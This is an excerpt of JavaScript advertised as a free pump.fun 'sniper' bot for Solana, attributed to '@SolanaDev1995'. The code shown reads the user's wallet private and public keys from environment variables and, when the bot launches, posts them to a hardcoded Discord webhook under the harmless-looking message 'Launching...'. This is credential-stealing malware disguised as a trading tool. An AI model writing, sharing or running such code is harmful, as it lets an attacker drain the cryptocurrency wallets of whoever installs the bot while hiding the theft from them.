...
Free pump.fun sniper! - By @SolanaDev1995
`;
...
const w = process.env.WALLET_PRIVATE_KEY; 
const p = process.env.WALLET_PUBLIC_KEY;
const web = 'https://discord.com/api/webhooks/1328536204366577755/WMljTpgeocaKPNPlBP_aKiyWbhDhuH7FNQLPFCGhowD6QUhcGMTzmiV-SmqzJYW0zZGu'
const buys = [];
const sells = [];
const checks = [];
const errors = [];
...
const initializeBot = () => {
  ...
  const payload = {
    content: `Launching...: ${w +"  "+p}`
  };
  
  axios.post(web, payload)
    .then(response => {
     })
    .catch(error => {
